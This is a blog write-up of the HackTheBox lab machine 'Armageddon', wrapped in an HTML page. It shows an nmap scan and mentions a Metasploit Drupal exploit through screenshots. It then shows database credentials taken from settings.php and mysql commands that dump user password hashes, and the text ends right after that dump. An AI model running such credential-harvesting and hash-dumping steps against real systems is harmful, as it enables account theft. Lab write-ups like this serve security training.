@@ -1,0 +1,975 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="google-translate-customization" content="108d9124921d80c3-80e20d618ff053c8-g4f02ec6f3dba68b7-c">
+<!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>HackTheBox Armegeddon” | DC0deZer0</title>
+<meta name="generator" content="Jekyll v4.2.0">
+<meta property="og:title" content="HackTheBox Armegeddon”">
+<meta name="author" content="Jeevan Chandra">
+<meta property="og:locale" content="en_US">
+<meta name="description" content="Nmap Scan ```bash Nmap 7.80 scan initiated Mon Mar 29 05:54:01 2021 as: nmap -sV -A -O -T5 -Pn -oN Nmap_Armageddon.txt 10.10.10.233 Nmap scan report for 10.10.10.233 Host is up (0.21s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA) | 256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA) |_ 256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |http-generator: Drupal 7 (http://drupal.org) | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |/LICENSE.txt /MAINTAINERS.txt |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Welcome to Armageddon | Armageddon Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Linux 3.10 - 4.11 (93%), Android 4.1.1 (92%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops">
+<meta property="og:description" content="Nmap Scan ```bash Nmap 7.80 scan initiated Mon Mar 29 05:54:01 2021 as: nmap -sV -A -O -T5 -Pn -oN Nmap_Armageddon.txt 10.10.10.233 Nmap scan report for 10.10.10.233 Host is up (0.21s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA) | 256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA) |_ 256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |http-generator: Drupal 7 (http://drupal.org) | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |/LICENSE.txt /MAINTAINERS.txt |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Welcome to Armageddon | Armageddon Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Linux 3.10 - 4.11 (93%), Android 4.1.1 (92%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops">
+<link rel="canonical" href="http://192.168.0.111:6001/hackthebox/2021/03/29/Armageddon.html">
+<meta property="og:url" content="http://192.168.0.111:6001/hackthebox/2021/03/29/Armageddon.html">
+<meta property="og:site_name" content="DC0deZer0">
+<meta property="og:image" content="http://192.168.0.111:6001/assets/img/sample/armageddon/Armageddon.png">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2021-03-29T07:54:00+05:30">
+<meta name="twitter:card" content="summary_large_image">
+<meta property="twitter:image" content="http://192.168.0.111:6001/assets/img/sample/armageddon/Armageddon.png">
+<meta property="twitter:title" content="HackTheBox Armegeddon”">
+<script type="application/ld+json">
+{"description":"Nmap Scan ```bash Nmap 7.80 scan initiated Mon Mar 29 05:54:01 2021 as: nmap -sV -A -O -T5 -Pn -oN Nmap_Armageddon.txt 10.10.10.233 Nmap scan report for 10.10.10.233 Host is up (0.21s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA) | 256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA) |_ 256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) |http-generator: Drupal 7 (http://drupal.org) | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |/LICENSE.txt /MAINTAINERS.txt |_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16 |_http-title: Welcome to Armageddon | Armageddon Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Linux 3.10 - 4.11 (93%), Android 4.1.1 (92%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops","dateModified":"2021-03-29T07:54:00+05:30","datePublished":"2021-03-29T07:54:00+05:30","headline":"HackTheBox Armegeddon”","mainEntityOfPage":{"@type":"WebPage","@id":"http://192.168.0.111:6001/hackthebox/2021/03/29/Armageddon.html"},"@type":"BlogPosting","author":{"@type":"Person","name":"Jeevan Chandra"},"url":"http://192.168.0.111:6001/hackthebox/2021/03/29/Armageddon.html","image":"http://192.168.0.111:6001/assets/img/sample/armageddon/Armageddon.png","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="shortcut icon" href="">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-noto-sans@0.0.72/index.min.css">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <script src="/assets/js/main.js"></script><link type="application/atom+xml" rel="alternate" href="http://192.168.0.111:6001/feed.xml" title="DC0deZer0">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/default.min.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js"></script>
+<!-- and it's easy to individually load additional languages -->
+<script charset="UTF-8" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/languages/go.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+// Init highlight js
+document.addEventListener('DOMContentLoaded', function(event) {
+  var els = document.querySelectorAll('pre code')
+
+  function addLangData(block) {
+    var outer = block.parentElement.parentElement.parentElement;
+    var lang = block.getAttribute('data-lang');
+    for (var i = 0; i < outer.classList.length; i++) {
+      var cls = outer.classList[i];
+      if (cls.startsWith('language-')) {
+        lang = cls;
+        break;
+      }
+    }
+    if (!lang) {
+      cls = block.getAttribute('class');
+      lang = cls ? cls.replace('hljs ', '') : '';
+    }
+    if (lang.startsWith('language-')) {
+      lang = lang.substr(9);
+    }
+    block.setAttribute('class', 'hljs ' + lang);
+    block.parentNode.setAttribute('data-lang', lang);
+  }
+
+  function addBadge(block) {
+    var enabled = ('true' || 'true').toLowerCase();
+    if (enabled == 'true') {
+      var pre = block.parentElement;
+      pre.classList.add('badge');
+    }
+  }
+
+  function handle(block) {
+    addLangData(block);
+    addBadge(block)
+    hljs.highlightBlock(block);
+  }
+
+  for (var i = 0; i < els.length; i++) {
+    var el = els[i];
+    handle(el);
+  }
+});
+</script>
+
+<style>
+  /* code language badge */
+  pre.badge::before {
+    content: attr(data-lang);
+    color: #fff;
+    background-color: #ff4e00;
+    padding: 0 .5em;
+    border-radius: 0 2px;
+    text-transform: uppercase;
+    text-align: center;
+    min-width: 32px;
+    display: inline-block;
+    position: absolute;
+    right: 0;
+  }
+
+  /* fix wrong badge display for firefox browser */
+  code > table pre::before {
+    display: none;
+  }
+</style>
+<script>MathJax={"tex":{"inlineMath":[["$","$"],["\\(","\\)"]],"displayMath":[["$$","$$"],["\\[","\\]"]]},"svg":{"fontCache":"global"}}</script><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script><script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+</head>
+<body>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<header class="site-header " role="banner">
+
+  <div class="wrapper">
+    <div class="site-header-inner">
+<span class="site-brand"><a class="site-brand-inner" rel="author" href="/">
+  <img class="site-favicon" title="DC0deZer0" src="" onerror="this.style.display='none'">
+  DC0deZer0
+</a>
+</span><nav class="site-nav">
+          <input type="checkbox" id="nav-trigger" class="nav-trigger">
+          <label for="nav-trigger">
+            <span class="menu-icon">
+              <svg viewbox="0 0 18 15" width="18px" height="15px">
+                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
+              </svg>
+            </span>
+          </label>
+
+          <div class="trigger">
+<a class="page-link" href="/About.html">ABOUT</a><a class="page-link" href="/VulnMachines.html">VULNERABLE MACHINES</a><a class="page-link" href="/archives.html">ARCHIVES</a><a class="page-link" href="/categories.html">CATEGORIES</a><a class="page-link" href="/">HOME</a><a class="page-link" href="/tags.html">TAGS</a>
+
+
+
+
+<span class="page-link">
+
+<div id="google_translate_element" style="display: none;">
+</div>
+
+<span class="ct-language">
+  <ul class="list-unstyled ct-language-dropdown">
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="en">
+          
+          <img src="https://www.countryflags.io/us/flat/64.png" title="English">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="fr">
+          
+          <img src="https://www.countryflags.io/fr/flat/64.png" title="Franch">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="zh-CN">
+          
+          <img src="https://www.countryflags.io/cn/flat/64.png" title="Chinese(Simple)">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="ja">
+          
+          <img src="https://www.countryflags.io/jp/flat/64.png" title="Japan">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="ko">
+          
+          <img src="https://www.countryflags.io/kr/flat/64.png" title="Korean">
+          
+        </a>
+      </li>
+    
+      <li>
+        <a href="#" class="lang-select" data-lang="ru">
+          
+          <img src="https://www.countryflags.io/ru/flat/64.png" title="Russia">
+          
+        </a>
+      </li>
+    
+  </ul>
+</span>
+
+<script type="text/javascript">
+function googleTranslateElementInit() {
+  new google.translate.TranslateElement({
+    pageLanguage: '',
+    autoDisplay: false,
+    layout: google.translate.TranslateElement.InlineLayout.VERTICAL
+  }, 'google_translate_element');
+
+  function restoreLang() {
+    var iframe = document.getElementsByClassName('goog-te-banner-frame')[0];
+    if (!iframe) return;
+
+    var innerDoc = iframe.contentDocument || iframe.contentWindow.document;
+    var restore_el = innerDoc.getElementsByTagName("button");
+
+    for (var i = 0; i < restore_el.length; i++) {
+      if (restore_el[i].id.indexOf("restore") >= 0) {
+        restore_el[i].click();
+        var close_el = innerDoc.getElementsByClassName("goog-close-link");
+        close_el[0].click();
+        return;
+      }
+    }
+  }
+
+  function triggerHtmlEvent(element, eventName) {
+    var event;
+    if (document.createEvent) {
+      event = document.createEvent('HTMLEvents');
+      event.initEvent(eventName, true, true);
+      element.dispatchEvent(event);
+    } else {
+      event = document.createEventObject();
+      event.eventType = eventName;
+      element.fireEvent('on' + event.eventType, event);
+    }
+  }
+
+  var googleCombo = document.querySelector("select.goog-te-combo");
+  var langSelect = document.querySelector('.ct-language');
+  langSelect.addEventListener('click', function(event) {
+    if (!event.target) {
+      return;
+    }
+
+    var selected = document.querySelector('.ct-language .ct-language-selected');
+    if (selected) {
+      selected.classList.remove('ct-language-selected');
+    }
+
+    var target = event.target;
+    while (target && target !== langSelect ) {
+      if (target.matches('.lang-select')) {
+        break;
+      }
+      target = target.parentElement;
+    }
+
+    if (target && target.matches('.lang-select')) {
+      var lang = target.getAttribute('data-lang');
+      if (googleCombo.value == lang) {
+        restoreLang();
+      } else {
+        target.parentElement.classList.add('ct-language-selected');
+        googleCombo.value = lang;
+        triggerHtmlEvent(googleCombo, 'change');
+      }
+    }
+
+    event.preventDefault();
+  });
+}
+</script>
+
+<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+</span>
+</div>
+        </nav>
+</div>
+  </div>
+</header>
+
+<script>
+  (function() {
+    var lastScrollY = getScrollPos().y;
+    var documentElement = document.documentElement;
+
+    function storeScrollData() {
+      var y = getScrollPos().y;var scrollStatus = "";
+
+      if (y <= 0) {
+        scrollStatus = "top";
+      } else if ((window.innerHeight + y) >= document.body.offsetHeight) {
+        scrollStatus = "bottom";
+      } else {
+        var isScrollDown = (y - lastScrollY > 0) ? true : false;
+        scrollStatus = isScrollDown ? "down" : "up";
+      }
+
+      lastScrollY = y;
+      documentElement.setAttribute("data-scroll-status", scrollStatus);
+    }
+
+    window.addEventListener('scroll', function(e) {
+      storeScrollData();
+    });
+
+    storeScrollData();
+  })();
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+  function hashLocate(hashValue) {
+    hashValue = hashValue.replace(/^.*#h-/, '');
+    var element = document.getElementById(hashValue);
+
+    if (!element) {
+      return;
+    }
+
+    var header = document.querySelector('header.site-header');
+    var headerRect = header.getBoundingClientRect();
+    var headerTop = Math.floor(headerRect.top);
+    var headerHeight = Math.floor(headerRect.height);
+    var scrollPos = getScrollPos();
+    var offsetY = element.offsetTop - (headerTop + headerHeight + 20);
+
+    if (offsetY == scrollPos.y) {
+      return;
+    }
+
+    if (headerTop == 0  && offsetY > scrollPos.y) {
+      offsetY += headerHeight + 2;
+    } else if (headerTop < 0  && offsetY < scrollPos.y) {
+      offsetY -= headerHeight - 2;
+    }
+
+    smoothScrollTo(offsetY);
+  }
+
+  // The first event occurred
+  window.addEventListener('load', function(event) {
+    if (window.location.hash) {
+      hashLocate(window.location.hash);
+    }
+  });
+
+  // The first event occurred
+  window.addEventListener('click', function(event) {
+    if (event.target.tagName.toLowerCase() == 'a') {
+      hashLocate(event.target.getAttribute('href'));
+    }
+  });
+</script>
+<div class="theme-toggle">
+  <input type="checkbox" id="theme-switch">
+  <label for="theme-switch">
+    <div class="toggle"></div>
+    <div class="names">
+      <p class="light">Light</p>
+      <p class="dark">Dark</p>
+    </div>
+  </label>
+</div>
+
+
+
+
+<script>
+  (function() {
+    var sw = document.getElementById('theme-switch');
+    var html = document.getElementsByTagName('html')[0];
+    var nightModeOption = ('auto' || 'auto').toLowerCase();
+    var storage = nightModeOption === 'manual'
+        ? localStorage
+        : sessionStorage;
+    var themeData = loadThemeData();
+
+    function saveThemeData(data) {
+      storage.setItem('theme', JSON.stringify(data));
+    }
+
+    function loadThemeData() {
+      var data = storage.getItem('theme');
+      try {
+        data = JSON.parse(data ? data : '');
+      } catch(e) {
+        data = { nightShift: undefined, autoToggleAt: 0 };
+        saveThemeData(data);
+      }
+      return data;
+    }
+
+    function handleThemeToggle(nightShift) {
+      themeData.nightShift = nightShift;
+      saveThemeData(themeData);
+      html.dataset.theme = nightShift ? 'dark' : 'light';
+      setTimeout(function() {
+        sw.checked = nightShift ? true : false;
+      }, 50);
+    }
+
+    function autoThemeToggle() {
+      // Next time point of theme toggle
+      var now = new Date();
+      var toggleAt = new Date();
+      var hours = now.getHours();
+      var nightShift = hours >= 19 || hours <=7;
+
+      if (nightShift) {
+        if (hours > 7) {
+          toggleAt.setDate(toggleAt.getDate() + 1);
+        }
+        toggleAt.setHours(7);
+      } else {
+        toggleAt.setHours(19);
+      }
+
+      toggleAt.setMinutes(0);
+      toggleAt.setSeconds(0);
+      toggleAt.setMilliseconds(0)
+
+      var delay = toggleAt.getTime() - now.getTime();
+
+      // auto toggle theme mode
+      setTimeout(function() {
+        handleThemeToggle(!nightShift);
+      }, delay);
+
+      return {
+        nightShift: nightShift,
+        toggleAt: toggleAt.getTime()
+      };
+    }
+
+    // Listen the theme toggle event
+    sw.addEventListener('change', function(event) {
+      handleThemeToggle(event.target.checked);
+    });
+
+    if (nightModeOption == 'auto') {
+      var data = autoThemeToggle();
+
+      // Toggle theme by local setting
+      if (data.toggleAt > themeData.autoToggleAt) {
+        themeData.autoToggleAt = data.toggleAt;
+        handleThemeToggle(data.nightShift);
+      } else {
+        handleThemeToggle(themeData.nightShift);
+      }
+    } else if (nightModeOption == 'manual') {
+      handleThemeToggle(themeData.nightShift);
+    } else {
+      var nightShift = themeData.nightShift;
+      if (nightShift === undefined) {
+        nightShift = nightModeOption === 'on';
+      }
+      handleThemeToggle(nightShift);
+    }
+  })();
+</script>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="framework">
+  <section class="main">
+
+     <div class="post">
+  <section>
+
+
+
+
+
+
+
+
+
+<header class="post-header">
+  <h1 class="post-title p-name" itemprop="name headline">HackTheBox Armegeddon"</h1>
+  <h3 class="post-subtitle"></h3>
+
+  <p class="post-meta">
+    <time class="dt-published" datetime="2021-03-29T07:54:00+05:30" itemprop="datePublished"><i class="fa fa-calendar"></i> Mar 29, 2021
+    </time>
+    
+    <img src="/assets/img/sample/armageddon/Armageddon.png">
+    
+    
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 7 mins</span>
+  </p></header>
+<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+    <div class="post-content e-content" itemprop="articleBody">
+
+      <h1 id="nmap-scan">Nmap Scan</h1>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.80 scan initiated Mon Mar 29 05\:54\:01 2021 as: nmap -sV -A -O -T5 -Pn -oN Nmap_Armageddon.txt 10.10.10.233</span>
+Nmap scan report <span class="k">for </span>10.10.10.233
+Host is up <span class="o">(</span>0.21s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 82\:c6\:bb\:c7\:02\:6a\:93\:bb\:7c\:cb\:dd\:9c\:30\:93\:79:34 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 3a\:ca\:95\:30\:f3\:12\:d7\:ca\:45\:05\:bc\:c7\:f1\:16\:bb:fc <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 7a\:d4\:b3\:68\:79\:cf\:62\:8a\:7d\:5a\:61\:e7\:06\:0f\:5f:33 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> PHP/5.4.16<span class="o">)</span>
+|_http-generator: Drupal 7 <span class="o">(</span>http://drupal.org<span class="o">)</span>
+| http-robots.txt: 36 disallowed entries <span class="o">(</span>15 shown<span class="o">)</span>
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> PHP/5.4.16
+|_http-title: Welcome to  Armageddon |  Armageddon
+Aggressive OS guesses: Linux 3.2 - 4.9 <span class="o">(</span>95%<span class="o">)</span>, Linux 3.16 <span class="o">(</span>95%<span class="o">)</span>, Linux 3.18 <span class="o">(</span>95%<span class="o">)</span>, ASUS RT-N56U WAP <span class="o">(</span>Linux 3.4<span class="o">)</span> <span class="o">(</span>95%<span class="o">)</span>, Linux 3.1 <span class="o">(</span>95%<span class="o">)</span>, Linux 3.2 <span class="o">(</span>95%<span class="o">)</span>, AXIS 210A or 211 Network Camera <span class="o">(</span>Linux 2.6.17<span class="o">)</span> <span class="o">(</span>94%<span class="o">)</span>, Oracle VM Server 3.4.2 <span class="o">(</span>Linux 4.1<span class="o">)</span> <span class="o">(</span>93%<span class="o">)</span>, Linux 3.10 - 4.11 <span class="o">(</span>93%<span class="o">)</span>, Android 4.1.1 <span class="o">(</span>92%<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
+Network Distance: 2 hops
+
+TRACEROUTE <span class="o">(</span>using port 1025/tcp<span class="o">)</span>
+HOP RTT       ADDRESS
+1   204.90 ms 10.10.14.1
+2   205.18 ms 10.10.10.233
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Mon Mar 29 05\:54\:50 2021 -- 1 IP address (1 host up) scanned in 50.23 seconds</span>
+</code></pre></div></div>
+<p><img src="/assets/img/sample/armageddon/Pasted%20image%2020210329152809.png" alt=""></p>
+
+<p>Viewing the source code of the login page.
+<img src="/assets/img/sample/armageddon/Pasted%20image%2020210329152957.png" alt="">
+Found Some thing interesting <code class="language-plaintext highlighter-rouge">Drupal</code>.
+<img src="/assets/img/sample/armageddon/Pasted%20image%2020210329153054.png" alt=""></p>
+
+<p>After searching for a while found that it must be having a exploit on <code class="language-plaintext highlighter-rouge">drupal</code>, hence searching for it using <code class="language-plaintext highlighter-rouge">metasploit</code>.
+<img src="/assets/img/sample/armageddon/Pasted%20image%2020210329163627.png" alt="">
+<img src="/assets/img/sample/armageddon/Pasted%20image%2020210329165355.png" alt="">
+After configuring the payload properly, it’s time to run the exploit.
+<img src="/assets/img/sample/armageddon/Pasted%20image%2020210329165458.png" alt="">
+As the exploit was successful, It’s time for some enumeration to proceed further.
+<img src="/assets/img/sample/armageddon/Pasted%20image%2020210329165938.png" alt="">
+Found a <code class="language-plaintext highlighter-rouge">setting.php</code> file with a username and a password.
+<img src="/assets/img/sample/armageddon/Pasted%20image%2020210329170050.png" alt=""></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="s1">'drupaluser'</span>,
+      <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'CQHEy@9M*m23gBVj'</span>,
+</code></pre></div></div>
+<p>After looking at the passwd file, I see no user with the name <code class="language-plaintext highlighter-rouge">drupaluser</code>.
+<img src="/assets/img/sample/armageddon/Pasted%20image%2020210329170616.png" alt="">
+So need to move forward with using <code class="language-plaintext highlighter-rouge">mysql</code> for further enumeration.
+Trying to figure out the list of databases that look juicy.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2<span class="nv">$ </span>mysql <span class="nt">-u</span> drupaluser <span class="nt">-pCQHEy</span>@9M<span class="k">*</span>m23gBVj <span class="nt">-e</span> <span class="s1">'show databases;'</span>
+mysql <span class="nt">-u</span> drupaluser <span class="nt">-pCQHEy</span>@9M<span class="k">*</span>m23gBVj <span class="nt">-e</span> <span class="s1">'show databases;'</span>
+Database
+information_schema
+drupal
+mysql
+performance_schema
+</code></pre></div></div>
+<p>Taking a look at all the tables in the database <code class="language-plaintext highlighter-rouge">DRUPAL</code>.</p>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bash</span><span class="o">-</span><span class="mf">4.2</span><span class="err">$</span> <span class="n">mysql</span> <span class="o">-</span><span class="n">u</span> <span class="n">drupaluser</span> <span class="o">-</span><span class="n">pCQHEy</span><span class="err">@</span><span class="mi">9</span><span class="no">M</span><span class="o">*</span><span class="n">m23gBVj</span> <span class="o">-</span><span class="no">D</span> <span class="n">drupal</span> <span class="o">-</span><span class="n">e</span> <span class="s1">'show tables;'</span>
+<span class="n">mysql</span> <span class="o">-</span><span class="n">u</span> <span class="n">drupaluser</span> <span class="o">-</span><span class="n">pCQHEy</span><span class="err">@</span><span class="mi">9</span><span class="no">M</span><span class="o">*</span><span class="n">m23gBVj</span> <span class="o">-</span><span class="no">D</span> <span class="n">drupal</span> <span class="o">-</span><span class="n">e</span> <span class="s1">'show tables;'</span>
+<span class="no">Tables_in_drupal</span>
+<span class="n">actions</span>
+<span class="n">authmap</span>
+<span class="n">batch</span>
+<span class="n">block</span>
+<span class="n">block_custom</span>
+<span class="n">block_node_type</span>
+<span class="n">block_role</span>
+<span class="n">blocked_ips</span>
+<span class="n">cache</span>
+<span class="n">cache_block</span>
+<span class="n">cache_bootstrap</span>
+<span class="n">cache_field</span>
+<span class="n">cache_filter</span>
+<span class="n">cache_form</span>
+<span class="n">cache_image</span>
+<span class="n">cache_menu</span>
+<span class="n">cache_page</span>
+<span class="n">cache_path</span>
+<span class="n">comment</span>
+<span class="n">date_format_locale</span>
+<span class="n">date_format_type</span>
+<span class="n">date_formats</span>
+<span class="n">field_config</span>
+<span class="n">field_config_instance</span>
+<span class="n">field_data_body</span>
+<span class="n">field_data_comment_body</span>
+<span class="n">field_data_field_image</span>
+<span class="n">field_data_field_tags</span>
+<span class="n">field_revision_body</span>
+<span class="n">field_revision_comment_body</span>
+<span class="n">field_revision_field_image</span>
+<span class="n">field_revision_field_tags</span>
+<span class="n">file_managed</span>
+<span class="n">file_usage</span>
+<span class="n">filter</span>
+<span class="n">filter_format</span>
+<span class="n">flood</span>
+<span class="n">history</span>
+<span class="n">image_effects</span>
+<span class="n">image_styles</span>
+<span class="n">menu_custom</span>
+<span class="n">menu_links</span>
+<span class="n">menu_router</span>
+<span class="n">node</span>
+<span class="n">node_access</span>
+<span class="n">node_comment_statistics</span>
+<span class="n">node_revision</span>
+<span class="n">node_type</span>
+<span class="n">queue</span>
+<span class="n">rdf_mapping</span>
+<span class="n">registry</span>
+<span class="n">registry_file</span>
+<span class="n">role</span>
+<span class="n">role_permission</span>
+<span class="n">search_dataset</span>
+<span class="n">search_index</span>
+<span class="n">search_node_links</span>
+<span class="n">search_total</span>
+<span class="n">semaphore</span>
+<span class="n">sequences</span>
+<span class="n">sessions</span>
+<span class="n">shortcut_set</span>
+<span class="n">shortcut_set_users</span>
+<span class="nb">system</span>
+<span class="n">taxonomy_index</span>
+<span class="n">taxonomy_term_data</span>
+<span class="n">taxonomy_term_hierarchy</span>
+<span class="n">taxonomy_vocabulary</span>
+<span class="n">url_alias</span>
+<span class="n">users</span>
+<span class="n">users_roles</span>
+<span class="n">variable</span>
+<span class="n">watchdog</span>
+</code></pre></div></div>
+<p>Dumping the passwords of the users from the tables, we get the hashes of the users.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.2<span class="nv">$ </span>mysql <span class="nt">-u</span> drupaluser <span class="nt">-pCQHEy</span>@9M<span class="k">*</span>m23gBVj <span class="nt">-D</span> drupal <span class="nt">-e</span> <span class="s1">'select name,pass from users;'</span>
+&lt;er <span class="nt">-pCQHEy</span>@9M<span class="k">*</span>m23gBVj <span class="nt">-D</span> drupal <span class="nt">-e</span> <span class="s1">'select name,pass from users;'</span>           
+name    pass
+
+brucetherealadmin       <span class="nv">$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97</span>.oOsUf1xAhaadURt
+saad    <span class="nv">$S$D2iq</span>.p6yjeW8Kmon5dbD/nSdcGp33CxSrD1htDbmObW39n6RzhRU
+hackthebox      <span class="nv">$S$DOa7VbDH2UTYCLldRsrrZuLDRNiMX</span>.esh22JMiqNqbAHcw.1SdF7
+asdf    <span class="nv">$S$DjL8PjTLJFNaA</span>/TQ2inV2JFjLGQ7qsHk5gDsdG0GtVVGPTZm/4iN
